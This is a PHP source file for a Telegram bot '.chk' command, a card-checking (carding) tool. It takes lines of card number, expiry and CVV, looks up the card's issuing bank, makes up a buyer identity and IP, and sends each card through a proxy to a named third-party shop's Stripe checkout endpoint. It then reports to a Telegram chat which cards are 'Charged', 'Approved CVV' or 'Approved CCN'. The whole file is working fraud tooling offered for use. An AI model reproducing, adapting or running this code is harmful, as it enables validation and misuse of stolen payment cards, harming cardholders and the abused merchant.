<?php 

if ($message == '.chk' or $message == '/chk' or $message == '!chk' or $message == ',chk' or $message == '?chk') {sendMessage($chatId, "<b>✅𝙶𝚊𝚝𝚎 𝙸𝚗𝚏𝚘: %0A• STRIPE CHARGE 8$ %0A• 𝙾𝚝𝚑𝚎𝚛 𝙶𝚊𝚝𝚎𝚜: /cmds </b>", $message_id);exit();}

include 'Tools/regex.php';

if ( empty($cc) or empty($mes) or empty($year) or empty($cvv) ) 
{sendMessage($chatId, "<b>⚠ [ALERT] PLEASE CHECK THE INPUT FIELDS AND TRY AGAIN</b>", $message_id);exit();}


$i     = explode("|", $lista);
$cc    = $i[0];
$c1 = substr($cc, 0, 4); 
$c2 = substr($cc, 4, 4); 
$c3 = substr($cc, 8, 4); 
$c4 = substr($cc, -4);
$mon   = $i[1];
$year  = $i[2];
$cvv   = $i[3];

if (number_format($mon) < 10){$mon = str_replace("0", "", $mon);};

if(strlen($year) == 2){
($year = "20"."$year");
};

if ($_SERVER['REQUEST_METHOD'] == "POST"){
extract($_POST);
}
elseif ($_SERVER['REQUEST_METHOD'] == "GET"){
extract($_GET);
}
///////////////////////////////////////////////////////////////////////////////////////////////////////////////



$first = ucfirst(str_shuffle('Kurfghjjjumi'));
$last = ucfirst(str_shuffle('appisbest'));
$com = ucfirst(str_shuffle('waifuu'));
$first1 = str_shuffle("kurumiapp85246");
$email = "".$first1."%40gmail.com";
$address = "".rand(0000,9999)."+Main+Street";
$ip = ''.rand(00,99).'.'.rand(000,999).'.'.rand(000,999).'.'.rand(00,99).'';
$mip = ''.rand(00,99).'.'.rand(00,99).'.'.rand(000,999).'.'.rand(00,99).'';
$ph = array("682","346","246");
$ph1 = array_rand($ph);
$phh = $ph[$ph1];
$phone = "$phh".rand(0000000,9999999)."";
$account = rand(000000,999999);
$invoice = rand(000000,999999);
$st = array("AL","NY","CA","FL","WA");
$st1 = array_rand($st);
$state = $st[$st1];
if ($state == "NY"){
$state = "New+York";
$zip = "10080";
$city = "New+York";
}
elseif ($state == "WA"){
$state = "Washington";
$zip = "98001";
$city = "Auburn";
}
elseif ($state == "AL"){
$state = "Alabama";
$zip = "35005";
$city = "Adamsville";
}
elseif ($state == "FL"){
$state = "Florida";
$zip = "32003";
$city = "Orange+Park";
}
else{
$state = "California";
$zip = "90201";
$city = "Bell";
};


///////////////////////////////////////////////////////////////////////////////////////////////////////////////

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$cc.'');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: lookup.binlist.net',
'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,**;q=0.8'));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, '');
$fim = curl_exec($ch);
$bank1 = GetStr($fim, '"bank":{"name":"', '"');
$name2 = GetStr($fim, '"name":"', '"');
$brand = GetStr($fim, '"brand":"', '"');
$country = GetStr($fim, '"country":{"name":"', '"');
$emoji = GetStr($fim, '"emoji":"', '"');
$name1 = "".$name2."".$emoji."";
$scheme = GetStr($fim, '"scheme":"', '"');
$type = GetStr($fim, '"type":"', '"');
$currency = GetStr($fim, '"currency":"', '"');
if(strpos($fim, '"type":"credit"') !== false){
$bin = 'Credit';
}else{
$bin = 'Debit';
}


////////////////////////////===[Webshare Details]

include 'Tools/proxy.php';

# 01 Req..
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.thechinanewyear.com/wp-content/plugins/ivacy-cart/inc/apinew.php');
curl_setopt($ch, CURLOPT_CONNECTTIMEOUT,15);
curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, 1);
curl_setopt($ch, CURLOPT_PROXY, $proxy);
curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);
curl_setopt($ch, CURLOPT_PROXYUSERPWD,$credentials);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
$headers = array(
'authority: thechinanewyear.com',
'origin: https://www.thechinanewyear.com',
'referer: https://www.thechinanewyear.com/buy-vpn/',
'Content-Type: application/x-www-form-urlencoded; charset=UTF-8',
'-ch-ua-platform: "Windows',
'sec-fetch-dest: document',
'sec-fetch-mode: navigate',
'sec-fetch-site: same-origin',
'sec-fetch-user: ?1',
'upgrade-insecure-requests: 1',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36',
);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookies.txt');
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookies.txt'); 
curl_setopt($ch, CURLOPT_POSTFIELDS, 'name='.$last.'+'.$com.'&email='.$first.'@gmail.com&iGDPRStatus=0&ga=GA1.1.526415935.1673167872&aff_params=%7B%22aff_custom_1%22%3A%22%22%2C%22aff_custom_2%22%3A%22%22%2C%22aff_custom_3%22%3A%22%22%2C%22aff_custom_4%22%3A%22%22%2C%22aff_custom_5%22%3A%22%22%2C%22aff_custom_6%22%3A%22%22%2C%22aff_custom_7%22%3A%22%22%7D&affiliate_admitad_network=%7B%22aff_custom_1%22%3A%22%22%2C%22aff_custom_2%22%3A%22%22%2C%22aff_custom_3%22%3A%22%22%2C%22aff_custom_4%22%3A%22%22%2C%22aff_custom_5%22%3A%22%22%2C%22aff_custom_6%22%3A%22%22%2C%22aff_custom_7%22%3A%22%22%7D&sLanguage=en&sCurrency=USD&sDomain=www.thechinanewyear.com&action=signup&billingcylce=monthly&paymentmethod=stripe&promocode=&discount=90&free_trial_days=0&free_trial_day_notaval=&prommo_discount=9.8505999999999993&recurring_value=9.95&country=US&affiliate_id=&chan=&track_affid=&campaign_id=&affiliate_visit=&pap_referrer=&ref=&se=&sAddons=&dedicatedip_addon_prices=0&dedicatedip_addon_productid=0&portforwarding_addon_prices=0&portforwarding_addon_productid=0&total_price=0.09&cardid=6943&iSignUpType=1&iSubscriptionType=1&refurl=https%3A%2F%2Fwww.thechinanewyear.com%2Fbuy-vpn%2F&data1=&data2=&iProductId=9&_wpnonce=d8c52e3fa5&g-recaptcha-response=&cardNumber='.$cc.'&expMonth='.$mon.'&expYear='.$year.'&cvc='.$cvv.'');
$curl01 = curl_exec($ch);
$info = curl_getinfo($ch);
$time11 = $info['total_time'];
$time = substr_replace($time11, '',4);
echo ($curl1);
$status = trim(strip_tags(getStr($curl01,'genuineErrorMessage":"','",')));

$update = file_get_contents('php://input');
$update = json_decode($update, TRUE);
$print = print_r($update);
$chatId = $update["message"]["chat"]["id"];
$gId = $update["message"]["from"]["id"];
$userId = $update["message"]["from"]["id"];
$firstname = $update["message"]["from"]["first_name"];
$username = $update["message"]["from"]["username"];
$message = $update["message"]["text"];
$message_id = $update["message"]["message_id"];

if (strpos($curl01, 'result":"success')){
sendMessage($chatId, "<b>━━━━━━━━━━━━━━━━━━━━━━━</b>%0A𝙶𝚊𝚝𝚎𝚠𝚊𝚢: STRIPE CHARGE %0A━━━━━━━━━━━━━━━━━━━━━━━%0A𝙲𝚊𝚛𝚍 : <code>$lista</code>%0A𝚂𝚝𝚊𝚝𝚞𝚜 : ✅ Charged Succesfully %0A<b>━━━━━━━ 𝙸𝚗𝚏𝚘 ━━━━━━━━</b>%0A<b>𝘽𝘼𝙉𝙆 ⇢ $bank1 %0A𝙏𝙔𝙋𝙀 ⇢ $scheme - $type - $brand</b>%0A<b>𝘾𝙊𝙐𝙉𝙏𝙍𝙔 ⇢ $name2 $emoji </b>%0A<b>━━━━━━━━━━━━━━━━━━━</b>%0A𝙲𝚑𝚎𝚌𝚔𝚎𝚍 𝚋𝚢 : <b><a href='tg://user?id=$username'>$username</a></b>%0A𝚃𝚒𝚖𝚎 𝚜𝚎𝚌𝚘𝚗𝚍𝚜 : <code>$time seconds</code>%0A𝙿𝚛𝚘𝚡𝚢 : <code>$proxy </code>%0A━━━━━━━━━━━━━━━━━━━━━━━%0A𝙱𝚘𝚝 𝚋𝚢 : <code>Fares </code>%0A━━━━━━━━━━━━━━━━━━━━━━━%0A", $message_id);}

elseif (strpos($curl01, 'result":"pending')){
sendMessage($chatId, "<b>━━━━━━━━━━━━━━━━━━━━━━━</b>%0A𝙶𝚊𝚝𝚎𝚠𝚊𝚢: STRIPE CHARGE %0A━━━━━━━━━━━━━━━━━━━━━━━%0A𝙲𝚊𝚛𝚍 : <code>$lista</code>%0A𝚂𝚝𝚊𝚝𝚞𝚜 : ✅ 3DS %0A𝚁𝚎𝚜𝚙𝚘𝚗𝚜𝚎: CVV Matched %0A<b>━━━━━━━ 𝙸𝚗𝚏𝚘 ━━━━━━━━</b>%0A<b>𝘽𝘼𝙉𝙆 ⇢ $bank1 %0A𝙏𝙔𝙋𝙀 ⇢ $scheme - $type - $brand</b>%0A<b>𝘾𝙊𝙐𝙉𝙏𝙍𝙔 ⇢ $name2 $emoji </b>%0A<b>━━━━━━━━━━━━━━━━━━━</b>%0A𝙲𝚑𝚎𝚌𝚔𝚎𝚍 𝚋𝚢 : <b><a href='tg://user?id=$username'>$username</a></b>%0A𝚃𝚒𝚖𝚎 𝚜𝚎𝚌𝚘𝚗𝚍𝚜 : <code>$time seconds</code>%0A𝙿𝚛𝚘𝚡𝚢 : <code>$proxy </code>%0A━━━━━━━━━━━━━━━━━━━━━━━%0A𝙱𝚘𝚝 𝚋𝚢 : <code>Fares </code>%0A━━━━━━━━━━━━━━━━━━━━━━━%0A", $message_id);}

elseif (strpos($curl01, 'Invalid account')){
sendMessage($chatId, "<b>━━━━━━━━━━━━━━━━━━━━━━━</b>%0A𝙶𝚊𝚝𝚎𝚠𝚊𝚢: STRIPE CHARGE %0A━━━━━━━━━━━━━━━━━━━━━━━%0A𝙲𝚊𝚛𝚍 : <code>$lista</code>%0A𝚂𝚝𝚊𝚝𝚞𝚜 : ❌ Failed To Charge %0A𝚁𝚎𝚜𝚙𝚘𝚗𝚜𝚎: Bank Account Closed %0A<b>━━━━━━━ 𝙸𝚗𝚏𝚘 ━━━━━━━━</b>%0A<b>𝘽𝘼𝙉𝙆 ⇢ $bank1 %0A𝙏𝙔𝙋𝙀 ⇢ $scheme - $type - $brand</b>%0A<b>𝘾𝙊𝙐𝙉𝙏𝙍𝙔 ⇢ $name2 $emoji </b>%0A<b>━━━━━━━━━━━━━━━━━━━</b>%0A𝙲𝚑𝚎𝚌𝚔𝚎𝚍 𝚋𝚢 : <b><a href='tg://user?id=$username'>$username</a></b>%0A𝚃𝚒𝚖𝚎 𝚜𝚎𝚌𝚘𝚗𝚍𝚜 : <code>$time seconds</code>%0A𝙿𝚛𝚘𝚡𝚢 : <code>$proxy </code>%0A━━━━━━━━━━━━━━━━━━━━━━━%0A𝙱𝚘𝚝 𝚋𝚢 : <code>Fares </code>%0A━━━━━━━━━━━━━━━━━━━━━━━%0A", $message_id);}

elseif (strpos($curl01, 'Could not find payment information')){
sendMessage($chatId, "<b>━━━━━━━━━━━━━━━━━━━━━━━</b>%0A𝙶𝚊𝚝𝚎𝚠𝚊𝚢: STRIPE CHARGE %0A━━━━━━━━━━━━━━━━━━━━━━━%0A𝙲𝚊𝚛𝚍 : <code>$lista</code>%0A𝚂𝚝𝚊𝚝𝚞𝚜 : ❌ Failed To Charge %0A𝚁𝚎𝚜𝚙𝚘𝚗𝚜𝚎:Could not find payment information %0A<b>━━━━━━━ 𝙸𝚗𝚏𝚘 ━━━━━━━━</b>%0A<b>𝘽𝘼𝙉𝙆 ⇢ $bank1 %0A𝙏𝙔𝙋𝙀 ⇢ $scheme - $type - $brand</b>%0A<b>𝘾𝙊𝙐𝙉𝙏𝙍𝙔 ⇢ $name2 $emoji </b>%0A<b>━━━━━━━━━━━━━━━━━━━</b>%0A𝙲𝚑𝚎𝚌𝚔𝚎𝚍 𝚋𝚢 : <b><a href='tg://user?id=$username'>$username</a></b>%0A𝚃𝚒𝚖𝚎 𝚜𝚎𝚌𝚘𝚗𝚍𝚜 : <code>$time seconds</code>%0A𝙿𝚛𝚘𝚡𝚢 : <code>$proxy </code>%0A━━━━━━━━━━━━━━━━━━━━━━━%0A𝙱𝚘𝚝 𝚋𝚢 : <code>Fares </code>%0A━━━━━━━━━━━━━━━━━━━━━━━%0A", $message_id);}

elseif (strpos($curl01, 'Your card is not supported')){
sendMessage($chatId, "<b>━━━━━━━━━━━━━━━━━━━━━━━</b>%0A𝙶𝚊𝚝𝚎𝚠𝚊𝚢: STRIPE CHARGE %0A━━━━━━━━━━━━━━━━━━━━━━━%0A𝙲𝚊𝚛𝚍 : <code>$lista</code>%0A𝚂𝚝𝚊𝚝𝚞𝚜 : ❌ Failed To Charge %0A𝚁𝚎𝚜𝚙𝚘𝚗𝚜𝚎: Your card is not supported %0A<b>━━━━━━━ 𝙸𝚗𝚏𝚘 ━━━━━━━━</b>%0A<b>𝘽𝘼𝙉𝙆 ⇢ $bank1 %0A𝙏𝙔𝙋𝙀 ⇢ $scheme - $type - $brand</b>%0A<b>𝘾𝙊𝙐𝙉𝙏𝙍𝙔 ⇢ $name2 $emoji </b>%0A<b>━━━━━━━━━━━━━━━━━━━</b>%0A𝙲𝚑𝚎𝚌𝚔𝚎𝚍 𝚋𝚢 : <b><a href='tg://user?id=$username'>$username</a></b>%0A𝚃𝚒𝚖𝚎 𝚜𝚎𝚌𝚘𝚗𝚍𝚜 : <code>$time seconds</code>%0A𝙿𝚛𝚘𝚡𝚢 : <code>$proxy </code>%0A━━━━━━━━━━━━━━━━━━━━━━━%0A𝙱𝚘𝚝 𝚋𝚢 : <code>Fares </code>%0A━━━━━━━━━━━━━━━━━━━━━━━%0A", $message_id);}

elseif (strpos($curl01, 'Your card has expired')){
sendMessage($chatId, "<b>━━━━━━━━━━━━━━━━━━━━━━━</b>%0A𝙶𝚊𝚝𝚎𝚠𝚊𝚢: STRIPE CHARGE %0A━━━━━━━━━━━━━━━━━━━━━━━%0A𝙲𝚊𝚛𝚍 : <code>$lista</code>%0A𝚂𝚝𝚊𝚝𝚞𝚜 : ❌ Failed To Charge %0A𝚁𝚎𝚜𝚙𝚘𝚗𝚜𝚎: Your card has expired %0A<b>━━━━━━━ 𝙸𝚗𝚏𝚘 ━━━━━━━━</b>%0A<b>𝘽𝘼𝙉𝙆 ⇢ $bank1 %0A𝙏𝙔𝙋𝙀 ⇢ $scheme - $type - $brand</b>%0A<b>𝘾𝙊𝙐𝙉𝙏𝙍𝙔 ⇢ $name2 $emoji </b>%0A<b>━━━━━━━━━━━━━━━━━━━</b>%0A𝙲𝚑𝚎𝚌𝚔𝚎𝚍 𝚋𝚢 : <b><a href='tg://user?id=$username'>$username</a></b>%0A𝚃𝚒𝚖𝚎 𝚜𝚎𝚌𝚘𝚗𝚍𝚜 : <code>$time seconds</code>%0A𝙿𝚛𝚘𝚡𝚢 : <code>$proxy </code>%0A━━━━━━━━━━━━━━━━━━━━━━━%0A𝙱𝚘𝚝 𝚋𝚢 : <code>Fares </code>%0A━━━━━━━━━━━━━━━━━━━━━━━%0A", $message_id);}

elseif (strpos($curl01, 'not a valid credit card number')){
sendMessage($chatId, "<b>━━━━━━━━━━━━━━━━━━━━━━━</b>%0A𝙶𝚊𝚝𝚎𝚠𝚊𝚢: STRIPE CHARGE %0A━━━━━━━━━━━━━━━━━━━━━━━%0A𝙲𝚊𝚛𝚍 : <code>$lista</code>%0A𝚂𝚝𝚊𝚝𝚞𝚜 : ❌ Failed To Charge %0A𝚁𝚎𝚜𝚙𝚘𝚗𝚜𝚎: $status%0A<b>━━━━━━━ 𝙸𝚗𝚏𝚘 ━━━━━━━━</b>%0A<b>𝘽𝘼𝙉𝙆 ⇢ $bank1 %0A𝙏𝙔𝙋𝙀 ⇢ $scheme - $type - $brand</b>%0A<b>𝘾𝙊𝙐𝙉𝙏𝙍𝙔 ⇢ $name2 $emoji </b>%0A<b>━━━━━━━━━━━━━━━━━━━</b>%0A𝙲𝚑𝚎𝚌𝚔𝚎𝚍 𝚋𝚢 : <b><a href='tg://user?id=$username'>$username</a></b>%0A𝚃𝚒𝚖𝚎 𝚜𝚎𝚌𝚘𝚗𝚍𝚜 : <code>$time seconds</code>%0A𝙿𝚛𝚘𝚡𝚢 : <code>$proxy </code>%0A━━━━━━━━━━━━━━━━━━━━━━━%0A𝙱𝚘𝚝 𝚋𝚢 : <code>Fares </code>%0A━━━━━━━━━━━━━━━━━━━━━━━%0A", $message_id);}

elseif (strpos($curl01, 'declined')){
sendMessage($chatId, "<b>━━━━━━━━━━━━━━━━━━━━━━━</b>%0A𝙶𝚊𝚝𝚎𝚠𝚊𝚢: STRIPE CHARGE %0A━━━━━━━━━━━━━━━━━━━━━━━%0A𝙲𝚊𝚛𝚍 : <code>$lista</code>%0A𝚂𝚝𝚊𝚝𝚞𝚜 : ❌ Failed To Charge %0A𝚁𝚎𝚜𝚙𝚘𝚗𝚜𝚎: $status%0A<b>━━━━━━━ 𝙸𝚗𝚏𝚘 ━━━━━━━━</b>%0A<b>𝘽𝘼𝙉𝙆 ⇢ $bank1 %0A𝙏𝙔𝙋𝙀 ⇢ $scheme - $type - $brand</b>%0A<b>𝘾𝙊𝙐𝙉𝙏𝙍𝙔 ⇢ $name2 $emoji </b>%0A<b>━━━━━━━━━━━━━━━━━━━</b>%0A𝙲𝚑𝚎𝚌𝚔𝚎𝚍 𝚋𝚢 : <b><a href='tg://user?id=$username'>$username</a></b>%0A𝚃𝚒𝚖𝚎 𝚜𝚎𝚌𝚘𝚗𝚍𝚜 : <code>$time seconds</code>%0A𝙿𝚛𝚘𝚡𝚢 : <code>$proxy </code>%0A━━━━━━━━━━━━━━━━━━━━━━━%0A𝙱𝚘𝚝 𝚋𝚢 : <code>Fares </code>%0A━━━━━━━━━━━━━━━━━━━━━━━%0A", $message_id);}

elseif (strpos($curl01, 'insufficient')){
sendMessage($chatId, "<b>━━━━━━━━━━━━━━━━━━━━━━━</b>%0A𝙶𝚊𝚝𝚎𝚠𝚊𝚢: STRIPE CHARGE %0A━━━━━━━━━━━━━━━━━━━━━━━%0A𝙲𝚊𝚛𝚍 : <code>$lista</code>%0A𝚂𝚝𝚊𝚝𝚞𝚜 : ✅ Approved CVV %0A𝚁𝚎𝚜𝚙𝚘𝚗𝚜𝚎: $status%0A<b>━━━━━━━ 𝙸𝚗𝚏𝚘 ━━━━━━━━</b>%0A<b>𝘽𝘼𝙉𝙆 ⇢ $bank1 %0A𝙏𝙔𝙋𝙀 ⇢ $scheme - $type - $brand</b>%0A<b>𝘾𝙊𝙐𝙉𝙏𝙍𝙔 ⇢ $name2 $emoji </b>%0A<b>━━━━━━━━━━━━━━━━━━━</b>%0A𝙲𝚑𝚎𝚌𝚔𝚎𝚍 𝚋𝚢 : <b><a href='tg://user?id=$username'>$username</a></b>%0A𝚃𝚒𝚖𝚎 𝚜𝚎𝚌𝚘𝚗𝚍𝚜 : <code>$time seconds</code>%0A𝙿𝚛𝚘𝚡𝚢 : <code>$proxy </code>%0A━━━━━━━━━━━━━━━━━━━━━━━%0A𝙱𝚘𝚝 𝚋𝚢 : <code>Fares </code>%0A━━━━━━━━━━━━━━━━━━━━━━━%0A", $message_id);}

elseif (strpos($curl01, 'Invalid card')){
sendMessage($chatId, "<b>━━━━━━━━━━━━━━━━━━━━━━━</b>%0A𝙶𝚊𝚝𝚎𝚠𝚊𝚢: STRIPE CHARGE %0A━━━━━━━━━━━━━━━━━━━━━━━%0A𝙲𝚊𝚛𝚍 : <code>$lista</code>%0A𝚂𝚝𝚊𝚝𝚞𝚜 : ❌ Failed To Charge %0A𝚁𝚎𝚜𝚙𝚘𝚗𝚜𝚎: Card Error Rectify It and Try Again %0A<b>━━━━━━━ 𝙸𝚗𝚏𝚘 ━━━━━━━━</b>%0A<b>𝘽𝘼𝙉𝙆 ⇢ $bank1 %0A𝙏𝙔𝙋𝙀 ⇢ $scheme - $type - $brand</b>%0A<b>𝘾𝙊𝙐𝙉𝙏𝙍𝙔 ⇢ $name2 $emoji </b>%0A<b>━━━━━━━━━━━━━━━━━━━</b>%0A𝙲𝚑𝚎𝚌𝚔𝚎𝚍 𝚋𝚢 : <b><a href='tg://user?id=$username'>$username</a></b>%0A𝚃𝚒𝚖𝚎 𝚜𝚎𝚌𝚘𝚗𝚍𝚜 : <code>$time seconds</code>%0A𝙿𝚛𝚘𝚡𝚢 : <code>$proxy </code>%0A━━━━━━━━━━━━━━━━━━━━━━━%0A𝙱𝚘𝚝 𝚋𝚢 : <code>Fares </code>%0A━━━━━━━━━━━━━━━━━━━━━━━%0A", $message_id);}

elseif (strpos($curl01, 'number is incorrect')){
sendMessage($chatId, "<b>━━━━━━━━━━━━━━━━━━━━━━━</b>%0A𝙶𝚊𝚝𝚎𝚠𝚊𝚢: STRIPE CHARGE %0A━━━━━━━━━━━━━━━━━━━━━━━%0A𝙲𝚊𝚛𝚍 : <code>$lista</code>%0A𝚂𝚝𝚊𝚝𝚞𝚜 : ❌ Failed To Charge %0A𝚁𝚎𝚜𝚙𝚘𝚗𝚜𝚎: $status%0A<b>━━━━━━━ 𝙸𝚗𝚏𝚘 ━━━━━━━━</b>%0A<b>𝘽𝘼𝙉𝙆 ⇢ $bank1 %0A𝙏𝙔𝙋𝙀 ⇢ $scheme - $type - $brand</b>%0A<b>𝘾𝙊𝙐𝙉𝙏𝙍𝙔 ⇢ $name2 $emoji </b>%0A<b>━━━━━━━━━━━━━━━━━━━</b>%0A𝙲𝚑𝚎𝚌𝚔𝚎𝚍 𝚋𝚢 : <b><a href='tg://user?id=$username'>$username</a></b>%0A𝚃𝚒𝚖𝚎 𝚜𝚎𝚌𝚘𝚗𝚍𝚜 : <code>$time seconds</code>%0A𝙿𝚛𝚘𝚡𝚢 : <code>$proxy </code>%0A━━━━━━━━━━━━━━━━━━━━━━━%0A𝙱𝚘𝚝 𝚋𝚢 : <code>Fares </code>%0A━━━━━━━━━━━━━━━━━━━━━━━%0A", $message_id);}

elseif (strpos($curl01, 'not support this type of purchase')){
sendMessage($chatId, "<b>━━━━━━━━━━━━━━━━━━━━━━━</b>%0A𝙶𝚊𝚝𝚎𝚠𝚊𝚢: STRIPE CHARGE %0A━━━━━━━━━━━━━━━━━━━━━━━%0A𝙲𝚊𝚛𝚍 : <code>$lista</code>%0A𝚂𝚝𝚊𝚝𝚞𝚜 : ❌ Failed To Charge %0A𝚁𝚎𝚜𝚙𝚘𝚗𝚜𝚎: $status%0A<b>━━━━━━━ 𝙸𝚗𝚏𝚘 ━━━━━━━━</b>%0A<b>𝘽𝘼𝙉𝙆 ⇢ $bank1 %0A𝙏𝙔𝙋𝙀 ⇢ $scheme - $type - $brand</b>%0A<b>𝘾𝙊𝙐𝙉𝙏𝙍𝙔 ⇢ $name2 $emoji </b>%0A<b>━━━━━━━━━━━━━━━━━━━</b>%0A𝙲𝚑𝚎𝚌𝚔𝚎𝚍 𝚋𝚢 : <b><a href='tg://user?id=$username'>$username</a></b>%0A𝚃𝚒𝚖𝚎 𝚜𝚎𝚌𝚘𝚗𝚍𝚜 : <code>$time seconds</code>%0A𝙿𝚛𝚘𝚡𝚢 : <code>$proxy </code>%0A━━━━━━━━━━━━━━━━━━━━━━━%0A𝙱𝚘𝚝 𝚋𝚢 : <code>Fares </code>%0A━━━━━━━━━━━━━━━━━━━━━━━%0A", $message_id);}

elseif (strpos($curl01, 'security code is invalid')){
sendMessage($chatId, "<b>━━━━━━━━━━━━━━━━━━━━━━━</b>%0A𝙶𝚊𝚝𝚎𝚠𝚊𝚢: STRIPE CHARGE %0A━━━━━━━━━━━━━━━━━━━━━━━%0A𝙲𝚊𝚛𝚍 : <code>$lista</code>%0A𝚂𝚝𝚊𝚝𝚞𝚜 : ❌ Failed To Charge %0A𝚁𝚎𝚜𝚙𝚘𝚗𝚜𝚎: $status%0A<b>━━━━━━━ 𝙸𝚗𝚏𝚘 ━━━━━━━━</b>%0A<b>𝘽𝘼𝙉𝙆 ⇢ $bank1 %0A𝙏𝙔𝙋𝙀 ⇢ $scheme - $type - $brand</b>%0A<b>𝘾𝙊𝙐𝙉𝙏𝙍𝙔 ⇢ $name2 $emoji </b>%0A<b>━━━━━━━━━━━━━━━━━━━</b>%0A𝙲𝚑𝚎𝚌𝚔𝚎𝚍 𝚋𝚢 : <b><a href='tg://user?id=$username'>$username</a></b>%0A𝚃𝚒𝚖𝚎 𝚜𝚎𝚌𝚘𝚗𝚍𝚜 : <code>$time seconds</code>%0A𝙿𝚛𝚘𝚡𝚢 : <code>$proxy </code>%0A━━━━━━━━━━━━━━━━━━━━━━━%0A𝙱𝚘𝚝 𝚋𝚢 : <code>Fares </code>%0A━━━━━━━━━━━━━━━━━━━━━━━%0A", $message_id);}

elseif (strpos($curl01, 'expiration year is invalid')){
sendMessage($chatId, "<b>━━━━━━━━━━━━━━━━━━━━━━━</b>%0A𝙶𝚊𝚝𝚎𝚠𝚊𝚢: STRIPE CHARGE %0A━━━━━━━━━━━━━━━━━━━━━━━%0A𝙲𝚊𝚛𝚍 : <code>$lista</code>%0A𝚂𝚝𝚊𝚝𝚞𝚜 : ❌ Failed To Charge %0A𝚁𝚎𝚜𝚙𝚘𝚗𝚜𝚎: $status%0A<b>━━━━━━━ 𝙸𝚗𝚏𝚘 ━━━━━━━━</b>%0A<b>𝘽𝘼𝙉𝙆 ⇢ $bank1 %0A𝙏𝙔𝙋𝙀 ⇢ $scheme - $type - $brand</b>%0A<b>𝘾𝙊𝙐𝙉𝙏𝙍𝙔 ⇢ $name2 $emoji </b>%0A<b>━━━━━━━━━━━━━━━━━━━</b>%0A𝙲𝚑𝚎𝚌𝚔𝚎𝚍 𝚋𝚢 : <b><a href='tg://user?id=$username'>$username</a></b>%0A𝚃𝚒𝚖𝚎 𝚜𝚎𝚌𝚘𝚗𝚍𝚜 : <code>$time seconds</code>%0A𝙿𝚛𝚘𝚡𝚢 : <code>$proxy </code>%0A━━━━━━━━━━━━━━━━━━━━━━━%0A𝙱𝚘𝚝 𝚋𝚢 : <code>Fares </code>%0A━━━━━━━━━━━━━━━━━━━━━━━%0A", $message_id);}

elseif (strpos($curl01, 'expiration month is invalid')){
sendMessage($chatId, "<b>━━━━━━━━━━━━━━━━━━━━━━━</b>%0A𝙶𝚊𝚝𝚎𝚠𝚊𝚢: STRIPE CHARGE %0A━━━━━━━━━━━━━━━━━━━━━━━%0A𝙲𝚊𝚛𝚍 : <code>$lista</code>%0A𝚂𝚝𝚊𝚝𝚞𝚜 : ❌ Failed To Charge %0A𝚁𝚎𝚜𝚙𝚘𝚗𝚜𝚎: $status%0A<b>━━━━━━━ 𝙸𝚗𝚏𝚘 ━━━━━━━━</b>%0A<b>𝘽𝘼𝙉𝙆 ⇢ $bank1 %0A𝙏𝙔𝙋𝙀 ⇢ $scheme - $type - $brand</b>%0A<b>𝘾𝙊𝙐𝙉𝙏𝙍𝙔 ⇢ $name2 $emoji </b>%0A<b>━━━━━━━━━━━━━━━━━━━</b>%0A𝙲𝚑𝚎𝚌𝚔𝚎𝚍 𝚋𝚢 : <b><a href='tg://user?id=$username'>$username</a></b>%0A𝚃𝚒𝚖𝚎 𝚜𝚎𝚌𝚘𝚗𝚍𝚜 : <code>$time seconds</code>%0A𝙿𝚛𝚘𝚡𝚢 : <code>$proxy </code>%0A━━━━━━━━━━━━━━━━━━━━━━━%0A𝙱𝚘𝚝 𝚋𝚢 : <code>Fares</code>%0A━━━━━━━━━━━━━━━━━━━━━━━%0A", $message_id);}

elseif (strpos($curl01, 'security code is incorrect')){
sendMessage($chatId, "<b>━━━━━━━━━━━━━━━━━━━━━━━</b>%0A𝙶𝚊𝚝𝚎𝚠𝚊𝚢: STRIPE CHARGE %0A━━━━━━━━━━━━━━━━━━━━━━━%0A𝙲𝚊𝚛𝚍 : <code>$lista</code>%0A𝚂𝚝𝚊𝚝𝚞𝚜 : ✅ Approved CCN %0A𝚁𝚎𝚜𝚙𝚘𝚗𝚜𝚎: $status%0A<b>━━━━━━━ 𝙸𝚗𝚏𝚘 ━━━━━━━━</b>%0A<b>𝘽𝘼𝙉𝙆 ⇢ $bank1 %0A𝙏𝙔𝙋𝙀 ⇢ $scheme - $type - $brand</b>%0A<b>𝘾𝙊𝙐𝙉𝙏𝙍𝙔 ⇢ $name2 $emoji </b>%0A<b>━━━━━━━━━━━━━━━━━━━</b>%0A𝙲𝚑𝚎𝚌𝚔𝚎𝚍 𝚋𝚢 : <b><a href='tg://user?id=$username'>$username</a></b>%0A𝚃𝚒𝚖𝚎 𝚜𝚎𝚌𝚘𝚗𝚍𝚜 : <code>$time seconds</code>%0A𝙿𝚛𝚘𝚡𝚢 : <code>$proxy </code>%0A━━━━━━━━━━━━━━━━━━━━━━━%0A𝙱𝚘𝚝 𝚋𝚢 : <code>Fares</code>%0A━━━━━━━━━━━━━━━━━━━━━━━%0A", $message_id);}

else{
sendMessage($chatId, ''.$status.'', $message_id);
}
curl_close($ch);

?>